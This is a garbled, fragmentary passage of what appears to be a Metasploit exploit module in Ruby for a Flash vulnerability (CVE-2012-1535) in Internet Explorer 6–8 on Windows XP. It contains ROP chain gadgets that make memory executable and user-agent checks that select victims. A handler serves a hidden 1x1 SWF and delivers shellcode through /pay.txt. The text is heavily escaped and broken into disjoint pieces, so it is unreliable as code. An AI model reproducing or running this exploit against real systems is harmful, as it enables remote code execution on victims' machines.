\ \ \ }\\r\
\ \ \ \\r\
\\r\
\ function mysubclass(){\\r\
\ \ \\r\
\\r\
\ \ this.watch("name", myfunc);\\r\
\ \ _global.ASnative(2204, 200)(this); // FileReference constructor\\r\

\ \ \ \ \ 0x1083c000, # RW pointer (lpOldProtect) (-> ecx)\\r\

\ \ \ \ \ 0x10663a00, # POP EDX # RETN (Flash32_11_3_300_268.ocx)\\r\

\ \ \ \ \ nop,        # NOPS (-> eax)\\r\
\ \ \ \ \ 0x1069120b, # PUSHAD # RETN (Flash32_11_3_300_268.ocx)\\r\
\ \ \ \ ].pack("V*")\\r\
\\r\

\ \ \ \ \ 0x0c0c0c0c,\\r\
\ \ \ \ \ 0x7c348b05, # xchg eax, esp # ret (1e0d0008)\\r\
\ \ \ \ ].pack("V*")\\r\
\\r\

\ \ \ \ \ 0x7c37653d, # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN\\r\
\ \ \ \ \ 0x00001000, # (dwSize)\\r\
\ \ \ \ \ 0x7c347f98, # RETN (ROP NOP)\\r\
\ \ \ \ \ 0x7c3415a2, # JMP [EAX]\\r\
\ \ \ \ \ 0xffffffff,\\r\

\ \ \ \ \ 0x7c352174, # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN\\r\
\ \ \ \ \ 0x7c344f87, # POP EDX # RETN\\r\
\ \ \ \ \ 0x00000040, # flNewProtect\\r\
\ \ \ \ \ 0x7c34d201, # POP ECX # RETN\\r\
\ \ \ \ \ 0x7c38b001, # &Writable location\\r\

\ \ \ \ \ 0x7c378c81, # PUSHAD # ADD AL,0EF # RETN\\r\
\ \ \ \ \ 0x7c345c30, # ptr to \\\'push esp #  ret \\\'\\r\
\ \ \ \ ].pack("V*")\\r\
\\r\
\ \ \ end\\r\

\\r\
\ def get_target(agent)\\r\
\ \ #If the user is already specified by the user, we\\\'ll just use that\\r\
\ \ return target if target.name != \\\'Automatic\\\'\\r\
\\r\
\ \ if agent =~ /NT 5\\\\.1/ and agent =~ /MSIE 6/\\r\
\ \ \ return targets[1]  #IE 6 on Windows XP SP3\\r\
\ \ elsif agent =~ /NT 5\\\\.1/ and agent =~ /MSIE 7/\\r\
\ \ \ return targets[2]  #IE 7 on Windows XP SP3\\r\
\ \ elsif agent =~ /NT 5\\\\.1/ and agent =~ /MSIE 8/\\r\
\ \ \ return targets[3]  #IE 8 on Windows XP SP3\\r\
\ \ else\\r\
\ \ \ return nil\\r\
\ \ end\\r\
\ end\\r\
\\r\
\ def on_request_uri(cli, request)\\r\
\\r\
\ \ agent = request.headers[\\\'User-Agent\\\']\\r\
\ \ print_status("User-agent: #{agent}")\\r\
\ \ my_target = get_target(agent)\\r\
\\r\
\ \ print_status("Client requesting: #{request.uri}")\\r\
\\r\
\ \ # Avoid the attack if the victim doesn\\\'t have the same setup we\\\'re targeting\\r\
\ \ if my_target.nil?\\r\
\ \ \ print_error("Browser not supported: #{agent}")\\r\
\ \ \ send_not_found(cli)\\r\
\ \ \ return\\r\
\ \ end\\r\
\\r\
\ \ # The SWF request itself\\r\
\ \ if request.uri =~ /\\\\.swf$/\\r\
\ \ \ print_status("Sending SWF")\\r\
\ \ \ send_response(cli, @swf, {\\\'Content-Type\\\'=>\\\'application/x-shockwave-flash\\\'})\\r\
\ \ \ return\\r\
\ \ end\\r\
\\r\
\ \ # The TXT payload request\\r\
\ \ if request.uri =~ /\\\\.txt$/\\r\
\ \ \ flash_version = request.headers[\\\'x-flash-version\\\']\\r\
\ \ \ shellcode = get_payload(my_target, flash_version).unpack(\\\'H*\\\')[0]\\r\
\ \ \ print_status("Sending Payload")\\r\
\ \ \ send_response(cli, shellcode, { \\\'Content-Type\\\' => \\\'text/plain\\\' })\\r\
\ \ \ return\\r\
\ \ end\\r\
\\r\
\ \ swf_uri = get_resource() + Rex::Text.rand_text_alphanumeric(rand(8)+4) + ".swf"\\r\
\\r\
\ \ html = %Q|\\r\
\ \ <html>\\r\
\ \ <head>\\r\
\ \ </head>\\r\
\ \ <body>\\r\
\ \ <object width="1" height="1" type="application/x-shockwave-flash" data="#{swf_uri}">\\r\
\ \ <param name="movie" value="#{swf_uri}">\\r\
\ \ </object>\\r\
\ \ </body>\\r\
\ \ </html>\\r\
\ \ |\\r\
\\r\
\ \ html = html.gsub(/^\\\ \\\ /, \\\'\\\')\\r\
\\r\
\ \ # we need to handle direct /pay.txt requests\\r\
\ \ proc = Proc.new do |cli, req|\\r\
\ \ \ on_request_uri(cli, req)\\r\
\ \ end\\r\
\ \ add_resource({\\\'Path\\\' => "/pay.txt", \\\'Proc\\\' => proc}) rescue nil\\r\
\\r\
\ \ print_status("Sending HTML")\\r\
\ \ send_response(cli, html, {\\\'Content-Type\\\'=>\\\'text/html\\\'})\\r\
\ end\\r\
\\r\
\ def exploit\\r\
\ \ @swf = create_swf\\r\
\ \ print_status("SWF Loaded: #{@swf.length.to_s} bytes")\\r\
\ \ super\\r\
\ end\\r\
\\r\
\ def create_swf\\r\
\ \ path = ::File.join( Msf::Config.install_root, "data", "exploits", "CVE-2012-1535", "trigger.swf" )\\r\
\ \ fd = ::File.open( path, "rb" )\\r\
\ \ swf = fd.read(fd.stat.size)\\r\
\ \ fd.close\\r\
\ \ return swf\\r\
\ end\\r\
\\r\
\ def cleanup\\r\
\ \ vprint_status("Removing txt resource")\\r\
\ \ remove_resource(\\\'/pay.txt\\\') rescue nil\\r\
\ \ super\\r\
\ end\\r\
\\r\
end\
